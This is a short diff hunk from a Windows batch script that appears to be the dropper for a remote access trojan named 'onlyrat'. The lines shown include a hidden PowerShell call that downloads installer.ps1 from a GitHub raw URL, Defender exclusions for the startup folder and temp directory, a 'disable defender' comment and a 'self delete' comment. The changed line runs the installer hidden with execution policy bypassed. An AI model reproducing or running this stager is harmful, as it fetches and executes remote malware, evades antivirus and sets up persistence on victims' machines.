@@ -33,7 +33,7 @@ REM disable defender
 
 REM rat resoures 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/installer.ps1  -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/installer.ps1"; Add-MpPreference -ExclusionPath "$env:temp"; 
-powershell powershell.exe -windowstyle hidden -ep bypass .\installer.ps1
+powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1
 
 @REM self delete
 @REM del wget.cmd
